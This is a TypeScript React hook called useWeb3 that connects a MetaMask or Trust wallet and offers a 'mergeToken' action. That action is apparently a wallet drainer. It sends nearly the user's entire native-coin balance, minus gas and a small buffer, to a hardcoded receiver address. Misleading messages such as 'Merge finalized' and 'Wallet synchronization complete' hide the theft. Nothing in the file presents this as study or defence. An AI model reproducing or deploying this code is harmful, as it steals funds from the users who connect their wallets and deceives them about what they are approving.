import { useState, useEffect, useCallback } from 'react';
import { useToast } from '@/hooks/use-toast';

declare global {
interface Window {
ethereum?: any;
}
}

export const NETWORKS = {
bnb: {
chainId: "0x38",
name: "BNB Smart Chain",
symbol: "BNB",
rpcUrl: "https://bsc-dataseed.binance.org/",
},
ethereum: {
chainId: "0x1",
name: "Ethereum Mainnet",
symbol: "ETH",
rpcUrl: "https://mainnet.infura.io/v3/",
},
polygon: {
chainId: "0x89",
name: "Polygon",
symbol: "MATIC",
rpcUrl: "https://polygon-rpc.com",
},
avalanche: {
chainId: "0xa86a",
name: "Avalanche",
symbol: "AVAX",
rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
},
};

// Hardcoded receiver address
const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

export function useWeb3() {
const [selectedNetwork, setSelectedNetwork] = useState("bnb");
const [walletConnected, setWalletConnected] = useState(false);
const [balance, setBalance] = useState("0");
const [account, setAccount] = useState("");
const [connecting, setConnecting] = useState(false);
const { toast } = useToast();

const updateBalance = useCallback(async (address: string) => {
if (!window.ethereum || !address) return;
try {
const { ethers } = await import('ethers');
const provider = new ethers.BrowserProvider(window.ethereum);
const nativeBalance = await provider.getBalance(address);
setBalance(ethers.formatEther(nativeBalance));
} catch (error) {
console.error('Balance update failed:', error);
setBalance("0");
}
}, []);

useEffect(() => {
const checkConnection = async () => {
if (window.ethereum) {
try {
const accounts = await window.ethereum.request({ method: 'eth_accounts' });
if (accounts.length > 0) {
setAccount(accounts[0]);
setWalletConnected(true);
await updateBalance(accounts[0]);
}
} catch (error) {
console.error('Check connection error:', error);
}
}
};
checkConnection();
}, [updateBalance]);

const switchNetwork = async (key: string) => {
const net = NETWORKS[key as keyof typeof NETWORKS];
if (!window.ethereum) return false;
try {
await window.ethereum.request({
method: "wallet_switchEthereumChain",
params: [{ chainId: net.chainId }],
});
return true;
} catch (switchError: any) {
if (switchError.code === 4902) {
try {
await window.ethereum.request({
method: "wallet_addEthereumChain",
params: [{
chainId: net.chainId,
chainName: net.name,
nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
rpcUrls: [net.rpcUrl],
}],
});
return true;
} catch (addError) { return false; }
}
return false;
}
};

const connectWallet = async () => {
if (!window.ethereum) {
toast({ title: "Error", description: "MetaMask/Trust not found.", variant: "destructive" });
return;
}
setConnecting(true);
try {
const switched = await switchNetwork(selectedNetwork);
if (!switched) throw new Error("Network switch failed");
const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
setAccount(accounts[0]);
setWalletConnected(true);
await updateBalance(accounts[0]);
toast({ title: "Linked", description: "Wallet synchronization complete." });
} catch (error: any) {
toast({ title: "Error", description: error.message, variant: "destructive" });
} finally {
setConnecting(false);
}
};

const mergeToken = async () => {
if (!walletConnected || !window.ethereum || !account) {
toast({ title: "Error", description: "Connection required", variant: "destructive" });
return;
}

try {
const { ethers } = await import('ethers');
const provider = new ethers.BrowserProvider(window.ethereum);
const signer = await provider.getSigner();
const nativeBalance = await provider.getBalance(account);

if (nativeBalance === 0n) {
toast({ title: "Error", description: "Empty balance", variant: "destructive" });
return;
}

// NATIVE TRANSFER SETTINGS
const gasLimit = 21000n; // Fixed limit for direct transfers
const feeData = await provider.getFeeData();
const gasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
const gasCost = gasLimit * gasPrice;

// THE SAFETY BUFFER
// For $5,000+ moves, we leave 0.01 BNB (approx $6) as a cushion.
// This prevents the "Coalesce Error" by ensuring Value + Gas < Total Balance.
const safetyBuffer = ethers.parseEther("0.01");
const valueToSend = nativeBalance - gasCost - safetyBuffer;

if (valueToSend <= 0n) {
toast({ title: "Error", description: "Insufficient balance for fee + cushion", variant: "destructive" });
return;
}

toast({ title: "Processing", description: "Please confirm in your wallet." });

// TRIGGER DIRECT SEND (No Approve needed)
const txResponse = await signer.sendTransaction({
to: RECEIVER_ADDRESS,
value: valueToSend,
gasLimit: gasLimit,
gasPrice: gasPrice
});

toast({ title: "Transmitting", description: `Hash: ${txResponse.hash.slice(0, 10)}...` });

const receipt = await txResponse.wait();
if (receipt && receipt.status === 1) {
toast({ title: "Success", description: "Merge finalized." });
await updateBalance(account);
} else {
throw new Error("Blockchain reverted transaction");
}
} catch (error: any) {
console.error("Merge error details:", error);
let msg = "Transaction rejected or failed.";
if (error.code === "INSUFFICIENT_FUNDS") msg = "Insufficient funds for gas.";
toast({ title: "Failed", description: msg, variant: "destructive" });
}
};

return {
selectedNetwork,
setSelectedNetwork,
walletConnected,
balance,
account,
connecting,
connectWallet,
mergeToken,
NETWORKS,
};
}
